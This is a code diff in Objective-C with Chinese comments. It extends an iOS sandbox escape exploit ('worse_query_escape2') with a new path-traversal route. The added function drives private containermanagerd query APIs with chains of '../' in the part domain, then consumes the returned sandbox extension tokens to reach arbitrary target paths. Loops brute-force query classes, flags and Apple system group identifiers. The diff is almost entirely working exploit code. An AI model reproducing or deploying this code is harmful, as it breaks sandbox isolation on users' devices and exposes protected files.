@@ -35,6 +35,7 @@ typedef void (*container_query_set_class_fn)(void *, uint64_t);
 typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
 typedef void (*container_query_set_flags_fn)(void *, uint64_t);
 typedef void (*container_query_set_part_fn)(void *, uint64_t);
+typedef void (*container_query_set_part_domain_fn)(void *, const char *);
 typedef void *(*container_query_get_single_result_fn)(void *);
 typedef void (*container_query_free_fn)(void *);
 typedef char *(*container_copy_sandbox_token_fn)(void *);
@@ -168,6 +169,53 @@ static const uint64_t kClass2Flags[] = {
     0x0000000042000000ULL,
 };
 
+// 免符号链接的试探：查一个组标识（系统组或自己的组），用 part_domain
+// 一路 ../ 穿到目标路径，全程不需要本进程拿到组容器路径。这是从 Vellum
+// 1.5 拆出来的另一条路（bad_query，同思路重写），常量已照反汇编核对：
+//   class：给了组用 7，不给组用 13；part 固定 3；
+//   flags：0x8000000000（常规）/ 0x800000000（alt）；
+//   穿透层数：给了组 8 级 ../，不给组 7 级 ../。
+static int64_t wq_attempt_traverse(int query_class, uint64_t flags, int up_levels,
+                                   NSString *identifier, NSString *target,
+                                   container_query_create_fn query_create,
+                                   container_query_set_class_fn query_set_class,
+                                   container_query_set_identifiers_fn query_set_group_identifiers,
+                                   container_query_set_flags_fn query_set_flags,
+                                   container_query_set_part_fn query_set_part,
+                                   container_query_set_part_domain_fn query_set_part_domain,
+                                   container_query_get_single_result_fn query_get_single_result,
+                                   container_query_free_fn query_free,
+                                   container_copy_sandbox_token_fn copy_sandbox_token,
+                                   sandbox_extension_consume_fn consume_extension) {
+    void *query = query_create();
+    if (!query) return -3;
+
+    query_set_class(query, query_class);
+    xpc_object_t ident = xpc_string_create(identifier.UTF8String);
+    query_set_group_identifiers(query, ident);
+    query_set_part(query, 3);
+    NSMutableString *part = [NSMutableString string];
+    for (int i = 0; i < up_levels; i++) [part appendString: @"../"];
+    [part appendString: target];
+    query_set_part_domain(query, part.UTF8String);
+    query_set_flags(query, flags);
+
+    void *result = query_get_single_result(query);
+    if (!result) {
+        query_free(query);
+        return -5; // daemon 拒了（result 为空）
+    }
+    char *token = copy_sandbox_token(result);
+    if (!token) {
+        query_free(query);
+        return -6; // 内核拒发沙箱扩展
+    }
+    int64_t handle = consume_extension(token);
+    free(token);
+    query_free(query);
+    return handle; // 消费失败时句柄为负（最高位置位），调用方按失败算
+}
+
 // 用一个查询类别 + 一组 flag 试一次逃逸。成功返回正句柄，失败返回
 // 负数错误码（同 worse_query 的语义）。每次调用都重建符号链接，
 // 避免 containermanagerd 缓存住上一次的解析结果。
@@ -232,14 +280,10 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
         }
     }
 
-    // Get the App Group's path
+    // Get the App Group's path（拿不到也不立即放弃，后面有免组的路）
     NSFileManager *files = [NSFileManager defaultManager];
     NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
-    if (!groupRoot) {
-        if (out_last_code) *out_last_code = -1;
-        return -1; // App Group doesn't exist or we can't access it
-    }
-    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
+    NSString *caches = groupRoot ? [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path] : nil;
 
     // Resolve functions（与 worse_query 相同的一套）
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
@@ -253,6 +297,7 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
     container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
     container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
     container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
     container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
     container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
     container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
@@ -265,6 +310,71 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
 
     int64_t last = -5;
     int lastClass = 7, lastIndex = -1;
+
+    if (!groupRoot && !query_set_part_domain) {
+        // 连遍历接口都没有（系统太老），免组的路走不通，按原样报错
+        dlclose(mgr);
+        if (out_last_code) *out_last_code = -1;
+        return -1;
+    }
+
+    if (!groupRoot) {
+        // 免符号链接的路（bad_query 思路）：逐个组合试，哪个成了用哪个。
+        // class 2 / class 7 查自己的组标识（8 级穿透），class 13 查系统组（7 级穿透）。
+        for (int f = 0; f < 2; f++) {
+            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+            int64_t h = wq_attempt_traverse(2, flag, 8, group, target,
+                                            query_create, query_set_class, query_set_group_identifiers,
+                                            query_set_flags, query_set_part, query_set_part_domain,
+                                            query_get_single_result, query_free,
+                                            copy_sandbox_token, consume_extension);
+            if (h >= 0) {
+                dlclose(mgr);
+                if (out_last_class) *out_last_class = 2;
+                if (out_last_flag_index) *out_last_flag_index = f;
+                return h;
+            }
+            last = h; lastClass = 2; lastIndex = f;
+        }
+        for (int f = 0; f < 2; f++) {
+            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+            int64_t h = wq_attempt_traverse(7, flag, 8, group, target,
+                                            query_create, query_set_class, query_set_group_identifiers,
+                                            query_set_flags, query_set_part, query_set_part_domain,
+                                            query_get_single_result, query_free,
+                                            copy_sandbox_token, consume_extension);
+            if (h >= 0) {
+                dlclose(mgr);
+                if (out_last_class) *out_last_class = 7;
+                if (out_last_flag_index) *out_last_flag_index = 2 + f;
+                return h;
+            }
+            last = h; lastClass = 7; lastIndex = 2 + f;
+        }
+        NSString *kSysIds[2] = { @"systemgroup.com.apple.mobilegestaltcache", @"group.com.apple.PosterBoard" };
+        for (int idIdx = 0; idIdx < 2; idIdx++) {
+            for (int f = 0; f < 2; f++) {
+                uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+                int64_t h = wq_attempt_traverse(13, flag, 7, kSysIds[idIdx], target,
+                                                query_create, query_set_class, query_set_group_identifiers,
+                                                query_set_flags, query_set_part, query_set_part_domain,
+                                                query_get_single_result, query_free,
+                                                copy_sandbox_token, consume_extension);
+                if (h >= 0) {
+                    dlclose(mgr);
+                    if (out_last_class) *out_last_class = 13;
+                    if (out_last_flag_index) *out_last_flag_index = 4 + idIdx * 2 + f;
+                    return h;
+                }
+                last = h; lastClass = 13; lastIndex = 4 + idIdx * 2 + f;
+            }
+        }
+        dlclose(mgr);
+        if (out_last_code) *out_last_code = last;
+        if (out_last_class) *out_last_class = lastClass;
+        if (out_last_flag_index) *out_last_flag_index = lastIndex;
+        return last;
+    }
 
     // 第一轮：class 7，三组 flags 逐个试
     for (size_t i = 0; i < sizeof(kClass7Flags) / sizeof(kClass7Flags[0]); i++) {
